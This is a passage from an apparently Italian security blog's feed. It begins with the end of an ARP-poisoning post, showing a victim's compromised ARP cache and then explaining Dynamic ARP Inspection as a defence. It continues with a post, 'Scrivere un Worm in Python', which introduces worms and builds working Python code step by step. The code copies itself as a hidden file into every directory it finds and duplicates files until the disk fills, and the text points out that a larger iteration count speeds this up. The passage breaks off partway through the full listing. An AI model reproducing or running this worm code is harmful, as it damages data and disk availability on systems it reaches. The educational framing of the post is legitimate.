&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.176&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Si vede che la vittima malcapitata ha una cache ARP compromessa, poichè il gateway risulta avere lo stesso indirizzo MAC dell’attaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.&lt;/p&gt;
&lt;h1 id=&#34;come-prevenire-larp-poisoning-con-dai&#34;&gt;Come prevenire L&amp;rsquo;ARP Poisoning con DAI&lt;/h1&gt;
&lt;p&gt;L&amp;rsquo;ispezione ARP dinamica (DAI) è una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi.  La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini.  Il malintenzionato invia richieste o risposte ARP mappando l&amp;rsquo;indirizzo IP di un&amp;rsquo;altra stazione al proprio indirizzo MAC.&lt;/p&gt;
&lt;p&gt;DAI si basa sullo snooping DHCP.  Lo snooping DHCP ascolta gli scambi di messaggi DHCP e crea un database di associazioni di tuple valide (indirizzo MAC, indirizzo IP, interfaccia VLAN).&lt;/p&gt;
&lt;p&gt;Quando DAI è abilitato, lo switch elimina il pacchetto ARP se l&amp;rsquo;indirizzo MAC e l&amp;rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP.  Tuttavia, può essere superato attraverso mappature statiche.  I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non può essere eseguito o altri switch nella rete non eseguono l&amp;rsquo;ispezione ARP dinamica.  Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Scrivere un Worm in Python</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/scrivere-un-worm-in-python/scrivere_un_worm_in_python/</guid>
      <description>Table Of Contents:
 Cos&amp;rsquo;è un Worm Scrivere un worm in Python  In questo post voglio iniziare una mini serie sulla Malware Analysis, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.</description>
      <content>&lt;p&gt;&lt;strong&gt;Table Of Contents&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#cos---un-worm&#34;&gt;Cos&amp;rsquo;è un Worm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#scrivere-un-worm-in-python&#34;&gt;Scrivere un worm in Python&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In questo post voglio iniziare una mini serie sulla &lt;code&gt;Malware Analysis&lt;/code&gt;, al fine di comprendere qual&amp;rsquo;è il funzionamento di un virus, quali danni può comportare su un sistema e come scriverlo. La presa di consapevolezza di una certa minaccia, è la prima contromisura per potersi difendere da essa. Molti utente non sanno bene cos&amp;rsquo;è un Virus o qualsiasi altra sua variante, dunque questa serie prova a fare chiarezza sul tema mediante le ricerche che ho fatto in rete in merito.&lt;/p&gt;
&lt;h1 id=&#34;cosè-un-worm&#34;&gt;Cos&amp;rsquo;è un Worm&lt;/h1&gt;
&lt;p&gt;Un worm è un programma software dannoso che si replica sfruttando in modo indipendente le vulnerabilità nelle reti. A differenza di un virus, che richiede l&amp;rsquo;esecuzione di un programma host, i worm possono essere eseguiti da soli. A parte l&amp;rsquo;infezione iniziale dell&amp;rsquo;host, non richiedono la partecipazione dell&amp;rsquo;utente e possono diffondersi molto rapidamente sulla rete, di solito rallentandola.&lt;/p&gt;
&lt;p&gt;I worm condividono schemi simili: sfruttano le vulnerabilità del sistema, hanno un modo per propagarsi e contengono tutti codice dannoso (payload) per causare danni ai sistemi o alle reti dei computer.
I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. Nel 2001, il worm Code Red aveva infettato oltre 300.000 server in sole 19 ore.&lt;/p&gt;
&lt;p&gt;Alcune persone pensano che un worm informatico e un virus informatico siano la stessa cosa perché i due si comportano in modo simile.  Potrebbero persino usare termini come &amp;ldquo;worm computer virus&amp;rdquo; o &amp;ldquo;worm virus malware&amp;rdquo;.  La verità è che i due sono minacce comparabili ma diverse.&lt;/p&gt;
&lt;p&gt;La differenza fondamentale tra un virus e un worm è che i virus si basano sull&amp;rsquo;azione umana per l&amp;rsquo;attivazione e hanno bisogno di un sistema host per replicarsi.  In altre parole, un virus non danneggerà il tuo sistema a meno che tu non lo esegua.  Ad esempio, un virus su un&amp;rsquo;unità flash collegata al tuo computer non danneggerà il tuo sistema a meno che tu non lo attivi.  E come accennato in precedenza, un worm non ha bisogno di un sistema host o di un&amp;rsquo;azione dell&amp;rsquo;utente per diffondersi.&lt;/p&gt;
&lt;p&gt;Nel corso degli anni, ci sono stati alcuni vermi particolarmente devastanti. Alcuni vermi hanno causato miliardi di danni.  Ecco un breve elenco di alcuni famigerati:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Morris Worm:&lt;/strong&gt; noto anche come Internet worm, questo è stato uno dei primi worm informatici a diffondersi tramite Internet e guadagnare notorietà nei media.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bagle:&lt;/strong&gt; noto anche come Beagle, Mitglieder e Lodeight, questo worm di mailing di massa aveva molte varianti.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Blaster:&lt;/strong&gt; noto anche come MSBlast, Lovesan e Lovsan, questo worm ha attaccato i computer con Windows XP e Windows 2000.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Conficker:&lt;/strong&gt; noto anche come Downup, Downadup e Kido, questo worm ha sfruttato i difetti di Windows per infettare milioni di computer in oltre cento paesi.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ILOVEYOU:&lt;/strong&gt; Il worm ILOVEYOU ha infettato decine di milioni di computer in tutto il mondo, causando danni per miliardi di dollari.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mydoom:&lt;/strong&gt; questo è diventato il worm di posta elettronica a più rapida diffusione nel 2004, inviando posta indesiderata attraverso i computer.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ryuk:&lt;/strong&gt; Sebbene Ryuk non sia sempre stato un worm, ora è un ransomware simile a un worm.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SQL Slammer:&lt;/strong&gt; il worm SQL Slammer ha guadagnato fama per aver rallentato il traffico Internet con attacchi denial-of-service su alcuni host Internet.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Storm Worm:&lt;/strong&gt; questo worm ha utilizzato l&amp;rsquo;ingegneria sociale con notizie false di una tempesta disastrosa per lanciare botnet su macchine compromesse.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Stuxnet:&lt;/strong&gt; alcuni esperti ritengono che questo sofisticato worm sia stato sviluppato per anni per lanciare un attacco informatico.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Molti dei sintomi di un worm informatico sono simili a quelli di un virus informatico.  Ad esempio, potresti avere un worm se il tuo computer rallenta, si blocca, si blocca o genera messaggi di errore.  Potresti anche notare che i file sono mancanti o danneggiati o che lo spazio sul tuo disco rigido si sta rapidamente esaurendo inspiegabilmente.  Inoltre, potresti ricevere avvisi dal tuo firewall su una violazione.&lt;/p&gt;
&lt;p&gt;Come altre forme di malware, i worm informatici possono essere fermati con il giusto software antivirus e antimalware e pratiche informatiche sicure.  Si prega di non intrattenere collegamenti sospetti, e-mail, testi, messaggi, siti Web, reti di file P2P e unità.  Inoltre, aggiorna regolarmente il tuo software essenziale per proteggere il tuo computer da vulnerabilità come il difetto di Windows wormable e simili.&lt;/p&gt;
&lt;h1 id=&#34;scrivere-un-worm-in-python&#34;&gt;Scrivere un worm in Python&lt;/h1&gt;
&lt;p&gt;Il worm è un tipo di malware che replica se stesso e altri file per consumare spazio nei nostri dischi rigidi. Potresti scoprire che le tue unità o partizioni si riempiono senza alcun motivo visibile e ciò potrebbe accadere a causa di un worm.&lt;/p&gt;
&lt;p&gt;Un worm è diverso da un virus informatico in quanto i virus tipici infettano solo i file e i worm replicano i file e tengono i duplicati fuori dalla vista (come file nascosti).&lt;/p&gt;
&lt;p&gt;Avremo bisogno di due moduli per scrivere un worm. Qui, &lt;em&gt;os&lt;/em&gt; è il modulo più importante e lo utilizzeremo per elencare tutti i file e le directory oltre a recuperare i percorsi assoluti.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;shutil&lt;/em&gt; è usato per copiare il contenuto del file.  Ci sono ovviamente altri modi per farlo, tuttavia, ho scelto di farlo usando il metodo shutil.copyfile().&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; shutil
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Innanzitutto, creiamo una classe Worm e un metodo di inizializzazione per passare gli argomenti iniziali alla nostra classe creata.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Worm&lt;/span&gt;:
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, target_dir_list&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, iteration&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(path, type(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; path
            
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(target_dir_list, type(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; target_dir_list
            
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(target_dir_list, type(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iteration &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iteration &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iteration
        
        &lt;span style=&#34;color:#75715e&#34;&gt;# get own absolute path&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;own_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;realpath(__file__)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Qui abbiamo tre argomenti:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;path: definisce dove iniziare a cercare le directory (l&amp;rsquo;impostazione predefinita è la directory principale /)&lt;/li&gt;
&lt;li&gt;target_dir_list: l&amp;rsquo;utente può passare un elenco di directory di destinazione iniziali. Per impostazione predefinita è un elenco vuoto []&lt;/li&gt;
&lt;li&gt;iteration: Ho usato questo parametro per definire quante istanze creerà il worm per ogni file esistente in una directory (il valore predefinito è 2 solo a scopo di test, puoi aumentare o diminuire il numero, o meglio fornire valur durante la creazione di un oggetto della classe)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il primo metodo di cui abbiamo bisogno è elencare tutte le directory e le sottodirectory di destinazione in cui vogliamo copiare il nostro worm ei file esistenti nelle directory.&lt;/p&gt;
&lt;p&gt;Qui, sto evitando i file nascosti poiché include anche le directory principali (i file nascosti iniziano con il punto . in Linux o macOS).  A parte questo, aggiunge un file (le directory sono anche chiamate file nei file system basati su Unix) se si tratta di una directory e lo fa in modo ricorsivo per tutte le sottodirectory.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_directories&lt;/span&gt;(self,path):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(path)
        files_in_current_directory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;listdir(path)
        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; files_in_current_directory:
            &lt;span style=&#34;color:#75715e&#34;&gt;# avoid hidden files/directories (start with dot (.))&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
                &lt;span style=&#34;color:#75715e&#34;&gt;# get the full path&lt;/span&gt;
                absolute_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(path, file)
                print(absolute_path)

                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;isdir(absolute_path):
                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_directories(absolute_path)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Per replicare lo script stesso in tutte le directory di destinazione, otteniamo il percorso assoluto dello script che stiamo eseguendo, quindi copiamo il contenuto nelle directory di destinazione creando un nuovo file nascosto (inizia con un punto .) con lo stesso nome.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create_new_worm&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; directory &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list:
            destination &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(directory, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.worm.py&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;# copy the script in the new directory with similar name&lt;/span&gt;
            shutil&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copyfile(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;own_path, destination)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il seguente metodo verrà utilizzato per duplicare i file il numero di volte il valore che abbiamo dall&amp;rsquo;argomento di iterazione. Puoi inserire un numero elevato in modo che il disco rigido si riempia presto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;copy_existing_files&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; directory &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list:
            file_list_in_dir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;listdir(directory)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; file_list_in_dir:
                abs_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(directory, file)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; abs_path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;isdir(abs_path):
                    source &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; abs_path
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iteration):
                        destination &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(directory,(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;file&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(i)))
                        shutil&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copyfile(source, destination)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo metodo, chiameremo tutti i nostri metodi precedenti. Quindi, quando chiamiamo questo metodo utilizzando il nostro oggetto creato, il worm avvierà tutte le azioni in sequenza.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;start_worm_actions&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;list_directories(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path)
        print(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create_new_worm()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy_existing_files()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora, creiamo la nostra funzione principale ed eseguiamo il codice:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    current_directory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;abspath(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
    worm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Worm(path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;current_directory)
    worm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start_worm_actions()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Qui, per evitare di riempire il nostro disco, usiamo la directory esistente solo usando os.path.abspath(&amp;quot;&amp;quot;), e passiamolo come argomento durante la creazione di un oggetto della classe Worm. Finalmente chiamiamo il metodo di integrazione e siamo a posto.&lt;/p&gt;
&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; shutil

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Worm&lt;/span&gt;:
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, target_dir_list&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, iteration&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(path, type(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; path
            
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(target_dir_list, type(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; target_dir_list
            
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; isinstance(target_dir_list, type(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)):
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iteration &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iteration &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iteration
        
        &lt;span style=&#34;color:#75715e&#34;&gt;# get own absolute path&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;own_path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;realpath(__file__)
        
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_directories&lt;/span&gt;(self,path):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;target_dir_list&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(path)
        files_in_current_directory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;listdir(path)
        
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; file &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; files_in_current_directory:
            &lt;span style=&#34;color:#75715e&#34;&gt;# avoid hidden files/directories (start with dot (.))&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
                &lt;span style=&#34;color:#75715e&#34;&gt;# get the full path&lt;/span&gt;
